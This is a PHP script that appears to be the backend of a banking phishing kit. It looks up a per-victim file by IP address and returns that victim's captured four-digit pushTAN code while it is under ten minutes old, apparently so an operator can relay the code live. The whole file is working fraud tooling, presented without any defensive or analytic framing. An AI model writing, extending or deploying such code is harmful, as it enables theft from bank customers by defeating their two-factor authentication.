<?php
require_once 'functions.php';

// Sanitize IP input
$ip = isset($_GET['ip']) ? trim($_GET['ip']) : '';
if (empty($ip) || !filter_var($ip, FILTER_VALIDATE_IP)) {
    echo '';
    exit;
}

// Read directly from file for most up-to-date value
$file = get_victim_file_path($ip);
$value = '';

if (file_exists($file)) {
    $data = @json_decode(@file_get_contents($file), true);
    if (is_array($data) && isset($data['pushtan_value']) && !empty($data['pushtan_value']) && strlen($data['pushtan_value']) === 4) {
        // Check if it's not expired (less than 10 minutes old)
        if (isset($data['pushtan_time']) && (time() - $data['pushtan_time']) < 600) {
            $value = $data['pushtan_value'];
        }
    }
}

// Fallback to function if direct read didn't work
if (empty($value)) {
    $value = get_pushtan_value($ip);
}

if (empty($value) || $value === null) {
    echo '';
} else {
    echo htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
}
?>
